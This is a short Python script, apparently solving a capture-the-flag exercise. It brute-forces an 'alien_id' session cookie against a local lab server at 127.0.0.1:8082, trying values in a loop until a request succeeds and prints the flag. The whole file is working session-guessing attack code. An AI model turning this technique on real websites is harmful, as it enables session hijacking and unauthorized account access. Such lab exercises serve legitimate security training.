# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the logged in cookie value to get the flag.
# The cookie name the aliens are using is alien_id
# we believe the id is a number between 1 and 75

#we need to import the urllib.request module
import urllib.request



# The URL for the API
url = "http://127.0.0.1:8082/cookiestore"
method = "GET"

#cookie name is alien_id
cookie = "alien_id"
#cookie value is a number between 1 and 75
Count = 0

for x in range(80):
    #headers
    headers = {"Cookie": cookie + "=" + str(x)}
    #make a request to the url
    req = urllib.request.Request(url, headers=headers)
    #read the response
    try:
        response = urllib.request.urlopen(req)
        #decode the response
        the_page = response.read()
        print(the_page)
        break
    except urllib.error.HTTPError as e:
        print("Error: " + str(e.code))
        print("Reason: " + str(e.reason))
        print("Headers: " + str(e.headers))
        print("URL: " + str(e.url))
        print("Data: " + str(e.data))
        print("Count: " + str(Count))
        Count += 1
        continue
